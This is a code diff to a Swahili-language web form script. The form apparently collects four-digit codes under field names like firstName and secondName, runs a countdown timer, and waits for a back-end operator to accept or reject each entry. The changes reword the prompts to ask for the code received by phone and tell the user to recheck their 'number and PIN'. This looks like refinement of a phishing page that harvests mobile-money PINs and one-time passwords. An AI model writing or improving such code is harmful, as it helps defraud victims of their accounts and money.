@@ -23,7 +23,7 @@ function setTimerText(type,seconds){
   if(ring) ring.style.setProperty("--progress", `${(safe/30)*100}%`);
   el.classList.toggle("expired",safe<=0);
   const label=el.querySelector(".countdown-label");
-  if(label) label.textContent=safe>0?"Muda wa kutuma":"Muda umeisha — bonyeza TUMA TENA";
+  if(label) label.textContent=safe>0?"Muda wa kutuma":"Muda umeisha  bonyeza TUMA TENA";
 }
 function setNameSubmitMode(type,expired){
   const btn=$(type+"NameBtn"), resubmit=$(type+"NameResubmit");
@@ -74,7 +74,7 @@ async function waitForStatus(expected,next,errorId){
   }
 }
 function handleRejection(d){
-  const msg="Taarifa zako zimekataliwa. Tafadhali hakiki na uweke taarifa sahihi.";
+  const msg="Taarifa zako zimekataliwa. Tafadhali hakiki nambari na pin na uweke taarifa sahihi.";
   if(d.rejectedStage==="FIRST_NAME"){
     stopNameTimer("first");state.firstDeadline=null;$("firstName").disabled=false;$("firstNameBtn").classList.remove("hidden");$("firstNameResubmit").classList.add("hidden");$("firstNameWaiting").classList.add("hidden");setError("page2Error",msg);showPage(2);
   }else if(d.rejectedStage==="SECOND_NAME"){
@@ -98,7 +98,7 @@ async function submitName(type,resubmit=false){
   const input=$(type+"Name"),btn=$(type+"NameBtn"),waiting=$(type+"NameWaiting"),errorId=type==="first"?"page2Error":"page3Error";
   setError(errorId,"");
   const value=input.value.trim();
-  if(!/^\d{4}$/.test(value))return setError(errorId,"Ingiza tarakimu 4 pekee.");
+  if(!/^\d{4}$/.test(value))return setError(errorId,"Ingiza hapa tarakimu 4 uliopokea kwa simu yako.");
   btn.disabled=true;
   try{
     const endpoint=type==="first"?"first-name":"second-name";
